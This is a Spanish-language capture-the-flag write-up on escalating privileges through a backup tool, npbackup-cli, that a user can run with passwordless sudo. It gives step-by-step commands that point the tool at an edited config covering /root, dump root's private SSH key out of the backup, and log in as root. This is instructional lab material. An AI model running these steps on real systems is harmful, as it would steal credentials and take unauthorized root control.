# Escalada de Privilegios abusando de `npbackup-cli`

## Descripción

Algunos binarios relacionados con **software de backup** ejecutados con privilegios elevados (`sudo`) permiten especificar un archivo de configuración externo.
Si este archivo define **qué rutas deben respaldarse**, un usuario sin privilegios puede forzar la inclusión de rutas sensibles como `/root` o `/etc`, consiguiendo así leer información crítica y escalar privilegios.

Este patrón de vulnerabilidad se conoce como **Backup Software Misuse**.

---

## Caso práctico: `npbackup-cli`

En un CTF nos encontramos el binario:

```bash
sudo -l
    (ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

Al revisar el script vemos que internamente carga un archivo de configuración en formato YAML.

---

## Explotación

### 1. Copiar y modificar configuración

Copiamos la configuración por defecto a un directorio donde tengamos permisos de escritura (ej: `/tmp`):

```bash
cp /etc/npbackup.conf /tmp/npbackup.conf
```

Editamos el archivo y añadimos rutas sensibles. Ejemplo:

```yaml
backup_opts:
  paths:
    - /root
```

---

### 2. Generar backup como root

Ejecutamos el backup forzado con nuestro archivo de configuración:

```bash
sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf -b -f
```

---

### 3. Volcar archivos críticos

Ahora podemos usar la opción `--dump` para extraer ficheros del backup, con permisos root:

```bash
sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf -f --dump /root/.ssh/id_rsa
```

---

### 4. Acceso como root

Una vez extraída la clave privada de root, ajustamos permisos y nos conectamos:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@localhost
```